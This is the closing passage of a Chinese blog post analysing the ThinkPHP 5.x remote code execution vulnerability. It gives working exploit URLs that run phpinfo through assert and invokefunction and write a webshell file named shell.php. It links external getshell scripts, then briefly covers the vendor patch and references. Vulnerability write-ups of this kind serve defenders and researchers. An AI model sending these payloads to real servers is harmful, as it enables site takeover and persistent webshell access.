<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert

http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1

http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;
</code></pre></div><p>5.0.x php版本&gt;=5.4:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
</code></pre></div><p>这里也不写getshell的python脚本了 ，可以参考</p>
<p><code>https://github.com/theLSA/tp5-getshell</code></p>
<p><code>https://payloads.online/archivers/2018-12-05/1</code></p>
<h2 id="0x06-补丁分析">0x06 补丁分析</h2>
<p>下面是针对5.0和5.1的补丁，添加了正则过滤，导致无法再传入<code>\think\app</code>这种形式的控制器。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/29.png" alt=""></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/thinkphp-rce/30.png" alt=""></p>
<h2 id="0x07-结束">0x07 结束</h2>
<p>很多天没发文章，这个洞还是蛮厉害的，前段时间爆发的时候还看到有人用这个洞扫全网的ip。</p>
<h2 id="0x08-参考">0x08 参考</h2>
<p><a href="https://www.secpulse.com/archives/92835.html">https://www.secpulse.com/archives/92835.html</a></p>
<p><a href="https://paper.seebug.org/760/">https://paper.seebug.org/760/</a></p>
<p><a href="https://www.kancloud.cn/manual/thinkphp5_1/353946">https://www.kancloud.cn/manual/thinkphp5_1/353946</a></p>
<p><a href="http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/">http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/</a></p>
<p><a href="https://iaq.pw/archives/106">https://iaq.pw/archives/106</a></p>
<p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/upload-labs/">
            Upload-Labs 通关笔记
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/2019/">
            2019年我来了！
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-php-deserialization/" class="post-link">PHP反序列化研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>